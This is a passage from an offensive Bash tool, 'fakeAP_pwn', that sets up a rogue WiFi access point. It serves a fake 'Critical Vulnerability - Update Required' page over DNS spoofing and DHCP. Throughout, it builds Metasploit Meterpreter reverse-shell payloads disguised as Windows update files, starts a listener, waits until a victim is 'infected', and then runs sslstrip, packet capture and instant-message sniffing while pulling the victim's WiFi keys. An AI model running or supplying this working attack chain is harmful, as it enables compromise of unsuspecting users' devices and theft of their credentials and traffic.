#wmm_ac_vo_txop_limit=47
#wmm_ac_vo_acm=0
#enable_karma=1 # uncomment this line if you patched hostapd with karma
#accept_mac_file=/etc/hostapd/hostapd.accept
#deny_mac_file=/etc/hostapd/hostapd.deny" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat $path; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   #display faction "Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"
   #display action "Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"
   display action "Creating: Exploit (Windows)"
   if [ ! -e "$www/sbd.exe" ] ; then display error "sbd.exe is not in $www" 1>&2 ; cleanup; fi
   if [ -e "$www/Windows-KB183905-x86-ENU.exe" ]; then rm "$www/Windows-KB183905-x86-ENU.exe"; fi
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
   sleep 1
   if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then display error "Failed: Couldn't create exploit" 1>&2 ; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: Access point"
if [ "$apType" == "airbase-ng" ] ; then
   loopMain="False"
   i="1"
   for i in {1..3} ; do # Main Loop
      killall airbase-ng 2>/dev/null # Start fresh
      sleep 1
      command="airbase-ng -a $fakeMac -W 0 -c $channel -e \"$essid\"" # taken out y (try w,a)
      if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then command="$command -v"; fi
      action "Access Point" "$command $monitorInterface" "0|0|4" & # Don't wait, do the next command
      sleep 3
      ifconfig $apInterface up                                       # The new ap interface
      command=$(ifconfig -a | grep $apInterface | awk '{print $1}')
      if [ "$command" != "$apInterface" ] ; then
         display error "Couldn't create the access point's interface." 1>&2
      else
         #if [ "$diagnostics" != "true" ] || [ "$debug" != "true" ]  ; then loopMain="True"; break; fi  # Not in the correct mode
         #if [ "$mode" == "non" ] ; then loopMain="non"; break; fi                 # Not using $interface therefore can't test.
         command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
         if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isn't WiFi, therefore can't test.
         display diag "Attempt #$i to detect the 'fake' access point."
         loopSub="False"
         x="1"
         for x in {1..5} ; do # Subloop
            display diag "Scanning access point (Scan #$x)"
            testAP $essid $interface
            return_val=$?
            if [ "$return_val" -eq "0" ] ; then loopSub="True"; break; # Sub loop
            elif [ "$return_val" -eq "1" ] ; then display error "Coding error" ;
            elif [ "$return_val" -eq "2" ] ; then display error "Couldn't detect a single access point" ;
            elif [ "$return_val" -eq "3" ] ; then display error "Couldn't find the 'fake' access point" ;
            else display error "Unknown error." ; fi
            sleep 1
         done # Subloop
         if [ "$loopSub" == "True" ] ; then
            display info "Detected the 'fake' access point! ($essid)"
            loopMain="True"
            break; # MainLoop
         fi
      fi
      if [ -z "$(pgrep airbase-ng)" ] ; then
         display error "airbase-ng failed to start." 1>&2
         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
         cleanup
      fi
      sleep 3
   done # MainLoop
   if [ "$loopMain" == "False" ] ; then
      display error "Couldn't detect the 'fake' access point." 1>&2
   fi
elif [ "$apType" == "hostapd" ] ; then
   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" "0|0|4" & # Don't wait, do the next command
   sleep 3
   if [ -z "$(pgrep hostapd)" ] ; then
      display error "hostapd failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"
ifconfig lo up
ifconfig $apInterface 10.0.0.1 netmask 255.255.255.0
ifconfig $apInterface mtu $mtu
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
echo "1" > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ "$command" != "1" ] ; then display error "Can't enable ip_forward" 1>&2 ; cleanup ; fi
echo "1" > /proc/sys/net/ipv4/conf/$interface/forwarding
echo "1" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding
echo "1" > /proc/sys/net/ipv4/conf/$apInterface/forwarding
if   [ "$mode" == "normal" ] ; then ipTables transparent $apInterface $interface $gateway
elif [ "$mode" == "flip" ] ; then ipTables squid $apInterface $interface
elif [ "$mode" == "non" ] || [ "$mode" == "transparent" ] ; then ipTables force $apInterface
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Permissions" ; fi
action "DHCP" "chmod 775 /var/run/"
action "DHCP" "touch /var/lib/dhcp3/dhcpd.leases"
if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then # ubuntu - Fixes folder persmissions
   mv "/etc/dhcp3/dhcpd.conf" "/etc/dhcp3/dhcpd.conf.bkup"
   ln "/tmp/fakeAP_pwn.dhcp"  "/etc/dhcp3/dhcpd.conf"
fi

if [ "$mode" == "flip" ] ; then
   mkdir -p "$www/images"
   action "DHCP" "chmod 755 /tmp/fakeAP_pwn.pl"
   action "DHCP" "chmod 755 $www/images"
   action "DHCP" "chown proxy:proxy $www/images"
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: DHCP"
if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then command="dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf $apInterface"
else command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" ;
fi
action "DHCP" "$command" "0|75|5" & # -d = logging, -f = forground # Don't wait, do the next command
sleep 2
if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
   display error "DHCP server failed to start." 1>&2
   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   display action "Starting: DNS"
   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" "0|165|5" & # Don't wait, do the next command
   sleep 2

#----------------------------------------------------------------------------------------------#
   display action "Starting: Metasploit"
   command=$(netstat -ltpn | grep 4565)
   if [ ! -z "$command" ] ; then
      display error "Port 4564 isn't free." 1>&2 ;
      command=$(pgrep ruby)
      action "Killing ruby" "kill $command" # to prevent interference
      sleep 1
      command=$(netstat -ltpn | grep 4565)
      if [ ! -z "$command" ] ; then display error "Couldn't free port 4564." 1>&2 ; cleanup; fi # Kill it for them?
   fi
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" "0|255|15" & #ExitOnSession=false # Don't wait, do the next command
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download
   if [ -z "$(pgrep ruby)" ] ; then
      display error "Metaspliot failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
elif [ "$mode" == "flip" ] ; then
   display action "Starting: Squid"
   action "squid" "squid -f /tmp/fakeAP_pwn.squid"
   sleep 3
   if [ -z "$(pgrep squid)" ] ; then
      squid -f /tmp/fakeAP_pwn.squid # *** NEED A FIX ***
   fi
   sleep 3
   if [ -z "$(pgrep squid)" ] ; then
       display error "squid failed to start." 1>&2
       if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
       cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] ; then
   display action "Starting: Web server"
   if [ ! -e "/etc/ssl/private/ssl-cert-snakeoil.key" ] ; then
      display error "Need to renew certificate" ;
      make-ssl-cert generate-default-snakeoil --force-overwrite     
      #openssl genrsa -out server.key 1024
      #openssl req -new -x509 -key server.key -out server.pem -days 1826
      #mv -f "server.key" "/etc/ssl/private/ssl-cert-snakeoil.key"
      #mv -f "server.pem" "/etc/ssl/certs/ssl-cert-snakeoil.pem"
   fi
   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
   sleep 2
   if [ -z "$(pgrep apache2)" ] ; then
      display error "Apache2 failed to start." 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
   if [ "$diagnostics" == "true" ] ; then
      sleep 3
      display diag "Testing: Web server"
      command=$(wget -qO- "http://10.0.0.1" | grep "<title>Critical Vulnerability - Update Required</title>")
      if [ ! -z "$command" ] ; then
         echo "-->Web server: Okay" >> $logFile
      else
         display error "Web server: Failed" 1>&2 ;
         echo "-->Web server: Failed" >> $logFile
         wget -qO- "http://10.0.0.1" >> $logFile
      fi
   fi
fi

if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ] ; then
      display action "Configuring: VNC"
      action "VNC" "vncviewer -listen -compresslevel 4 -quality 4" "0|565|3" & # Don't wait, do the next command
   elif [ "$payload" == "sbd" ] ; then
      display action "Configuring: SBD"
      action "SBD" "sbd -l -k g0tmi1k -p $port" "0|565|10" & # Don't wait, do the next command
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
      display action "Monitoring connections"
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" "false" "0|475|5" & # Don't wait, do the next command
   fi
   display info "Waiting for the target to run the \"update\" file" # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
   if [ -e "/tmp/fakeAP_pwn.lock" ] ; then rm -r "/tmp/fakeAP_pwn.lock" ; fi
   while [ ! -e "/tmp/fakeAP_pwn.lock" ] ; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   display info "Target infected!"
   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> $logFile; fi
   targetIP=$(arp -n -v -i $apInterface | grep $apInterface | awk -F " " '{print $1}')
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "Target's IP = $targetIP" ; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> $logFile; fi

#----------------------------------------------------------------------------------------------#
   if [ "$mode" == "transparent" ] ; then
      display action "Restoring: Internet access"
      ipTables transparent $apInterface $interface $gateway
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ] ; then
      if [ ! -e "/tmp/fakeAP_pwn.wkv" ] ; then
         display error "Failed: Didn't download WiFi keys."
      else
         display action "Opening: WiFi Keys"
         action "WiFi Keys" "cat /tmp/fakeAP_pwn.wkv" "false" "0|565|10" "hold" & sleep 1
      fi
   fi

#----------------------------------------------------------------------------------------------#
else
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
      display action "Monitoring connections"
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" "false" "0|475|5" & # Don't close! We want to view this!
      sleep 1
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ] ; then
   display action "Caputuring: information from the target"
   ipTables sslstrip
   action "SSL" "sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl" "515|0|0" & # Don't wait, do the next command
   #action "Images" "driftnet -i $apInterface" "515|0|0" & # Don't wait, do the next command
   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" "515|0|10" & # Don't wait, do the next command
   action "IM" "imsniff $apInterface" "515|155|10" & # Don't wait, do the next command
   #action "URLs" "urlsnarf -i $apInterface" "515|155|10" & # Don't wait, do the next command
   #webspy / ettercap -P _browser_plugin
   #action "Passwords" "dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff" "0|0|0" & # Don't wait, do the next command
   #action "Passwords (2)" "ettercap -Tqp -i $apInterface // //" "10|0|10" & # Don't wait, do the next command
   #action "IM (2)" "msgsnarf -i $apInterface" "10|0|10" & # Don't wait, do the next command
   sleep 1
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "normal" ] || [ "$mode" == "flip" ] ; then
   display info "Ready! ...press CTRL+C to stop"
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanup clean


#---Roadmap------------------------------------------------------------------------------------#
# v0.4 - Multiple clients       - Each time a new client connects they will be redirected to our
#                                  crafted page without affecting any other clients who are browsing
# v0.4 - Firewall Rules         - Don't expose local machines from the internet interface
# v0.5 - Java exploit           - Different "delivery system" ;)
# v0.6 - Linux/OSX/x64          - Make compatible
# v0.7 - Clone AP               - Copies SSID & BSSID aftwards kicks connected client(s)
# v0.8 - S.E.T. & karmetasploit - Use "Social Engineering Toolkit" and or karmetasploit
#---Ideas--------------------------------------------------------------------------------------#
# Add: Beep on connected client
# Add: Download missing files
# Add: Generate index php, vnc.reg & embed images
# Add: Monitor traffic that isn't on port 80 before they download the payload
# Add: New modes - replace exe, kill, cookie, inject, redirect
# Add: Port check
# Add: Update airbase/airbase-ng & Update at start-up
# Add: VNC "spy" option
# Check: MTU
# Check: VNC
# Use: netsh advfirewall firewall add rule name="allow TightVNC" dir=in program="C:\\winvnc.exe" security=authenticate action=allow
# Use: vnc.rb in metasploit?
# Use: Re look at index.php - dont use http://10.0.0.1/[Filename]
# enable wicd? action "Starting network" "/etc/init.d/wicd start"
